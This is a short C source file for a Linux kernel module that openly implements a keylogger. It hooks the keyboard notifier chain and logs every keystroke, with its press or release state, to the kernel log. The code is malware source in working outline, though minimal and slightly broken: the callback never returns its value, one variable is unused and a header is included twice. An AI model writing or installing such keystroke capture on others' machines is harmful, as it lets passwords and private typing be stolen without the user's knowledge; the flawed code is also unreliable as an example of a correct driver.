/* Necessary includes for device drivers */
#include <linux/init.h>
#include "keylogger.h"
#include <linux/init.h>
#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/slab.h> /* kmalloc() */
#include <linux/fs.h> /* everything... */
#include <linux/errno.h> /* error codes */
MODULE_LICENSE("Dual BSD/GPL");

int keypress_notify(struct notifier_block *nblock, unsigned long code, void *_param)
{
	struct keyboard_notifier_param *param = _param;
	struct vc_data *vc = param->vc;

	int ret = NOTIFY_OK;

	if(code == KBD_KEYCODE){
		printk(KERN_DEBUG "Keylogger %i %s\n",c2k[param->value],(param->down?"down":"up"));
	}
}

static struct notifier_block nb = {.notifier_call = keypress_notify};

static int keylogger_init(void)
{
	register_keyboard_notifier(&nb);
	return 0;
}

static void keylogger_release(void)
{
	printk("Keylogger removed!");
	unregister_keyboard_notifier(&nb);
}

module_init(keylogger_init);
module_exit(keylogger_release);
